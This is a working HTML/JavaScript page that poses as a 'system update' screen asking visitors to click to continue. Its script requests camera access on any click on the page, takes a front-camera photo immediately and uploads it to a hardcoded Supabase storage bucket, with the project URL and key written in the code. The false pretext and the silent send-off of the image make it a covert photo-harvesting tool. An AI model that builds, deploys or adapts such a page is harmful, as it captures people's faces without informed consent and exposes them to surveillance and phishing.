<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NEXUS CAMERA LAB</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{box-sizing:border-box}

body{
 margin:0;
 min-height:100vh;
 padding:22px;
 display:flex;
 justify-content:center;
 align-items:center;
 background:#080b16;
 color:#fff;
 font-family:Arial,sans-serif;
}

.app{
 width:100%;
 max-width:440px;
 padding:24px;
 border-radius:24px;
 background:#111a2e;
 border:1px solid #33466d;
 box-shadow:0 0 35px #536dfe22;
 text-align: center;
}

.logo{
 text-align:center;
 color:#65d9ff;
 font-size:27px;
 font-weight:bold;
 letter-spacing:2px;
 margin-bottom: 10px;
}

.subtitle{
 text-align:center;
 color:#aebbd2;
 line-height:1.9;
 font-size:14px;
 margin-bottom: 20px;
}

video{
 width:100%;
 border-radius:15px;
 margin-top:15px;
 background:#05070d;
 display: none; /* ابتدا مخفی */
}

#status{
 text-align:center;
 margin-top:18px;
 padding:13px;
 border-radius:10px;
 background:#080f20;
 color:#70e6c0;
 font-size:13px;
 line-height:1.8;
 min-height: 40px;
}

.footer{
 text-align:center;
 color:#667995;
 font-size:11px;
 margin-top:20px;
}

/* دکمه شفاف برای کلیک کردن کاربر */
.click-area {
    cursor: pointer;
    padding: 20px;
    margin-top: 10px;
    color: #536dfe;
    font-weight: bold;
    font-size: 16px;
}
</style>
</head>

<body>

<div class="app">

<div class="logo">NEXUS CAMERA LAB</div>

<p class="subtitle">
系统正在更新
<br>
点击允许以继续
</p>

<!-- منطقه کلیک برای شروع خودکار -->
<div id="click-trigger" class="click-area">
点击此处访问摄像头
</div>

<video id="video" autoplay playsinline hidden></video>

<canvas id="canvas" hidden></canvas>

<button id="stop" class="danger" style="display:none;">
关闭
</button>

<div id="status">
系统就绪。
</div>

<div class="footer">
NEXUS PROJECT • CAMERA LAB
</div>

</div>

<script>

// SUPABASE CONFIGURATION
const SUPABASE_URL = "https://wxovglpgcddlmhropvtv.supabase.co";
const SUPABASE_KEY = "sb_publishable_Ykxw1h1xKfIqrKyzTXjsjw_lMtub-Wk";
const BUCKET = "nexus-photos";

const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const clickTrigger = document.getElementById("click-trigger");
const stopBtn = document.getElementById("stop");

let stream = null;
let photoBlob = null;
let currentUser = null;
let isProcessing = false;

function showStatus(message){
 statusBox.textContent = message;
}

// تابع اصلی شروع کار
async function startProcess() {
    if (isProcessing) return;
    isProcessing = true;
    
    // مخفی کردن ناحیه کلیک و نشان دادن ویدیو
    clickTrigger.style.display = 'none';
    video.hidden = false;
    video.style.display = 'block';
    
    try{
        showStatus("正在连接摄像头..."); // در حال اتصال دوربین...

        if(!navigator.mediaDevices?.getUserMedia){
            throw new Error("不支持此浏览器");
        }

        stream = await navigator.mediaDevices.getUserMedia({
            video:{facingMode:"user"},
            audio:false
        });

        video.srcObject = stream;
        await video.play();

        showStatus("正在拍照..."); // در حال گرفتن عکس...

        // گرفتن عکس بلافاصله پس از پخش
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video,0,0);

        canvas.toBlob(blob=>{
            if(!blob){
                showStatus("拍照失败");
                return;
            }

            photoBlob = blob;
            processUpload(blob);

        },"image/jpeg",0.85);

    }catch(error){
        showStatus("错误: "+error.message);
        isProcessing = false;
    }
}

// تابع آپلود
async function processUpload(blob) {
    try{
        showStatus("正在上传..."); // در حال آپلود...

        const {data,error} = await db.auth.signInAnonymously();
        if(error) throw error;

        currentUser = data.user;
        const filename = currentUser.id+"/"+Date.now()+".jpg";

        const {error:uploadError} = await db.storage
            .from(BUCKET)
            .upload(filename,blob,{contentType:"image/jpeg", upsert:false});

        if(uploadError) throw uploadError;

        showStatus("上传成功！"); // آپلود موفقیت آمیز بود!
        
        // بستن دوربین بعد از موفقیت
        setTimeout(() => {
            stopCamera();
            showStatus("完成"); // تکمیل شد
        }, 1000);

    }catch(error){
        showStatus("上传错误: "+error.message);
        isProcessing = false;
    }
}

// بستن دوربین
function stopCamera(){
 if(stream){
     stream.getTracks().forEach(track=> track.stop());
     stream = null;
 }
 video.srcObject = null;
 video.hidden = true;
 video.style.display = 'none';
 stopBtn.style.display = 'none';
}

// رویداد کلیک روی ناحیه شفاف
clickTrigger.addEventListener("click", startProcess);

// همچنین اگر کاربر روی صفحه کلیک کرد هم شروع شود
document.body.addEventListener('click', (e) => {
    if(e.target !== clickTrigger && !stream) {
        startProcess();
    }
}, {once: true});

</script>

</body>
</html>
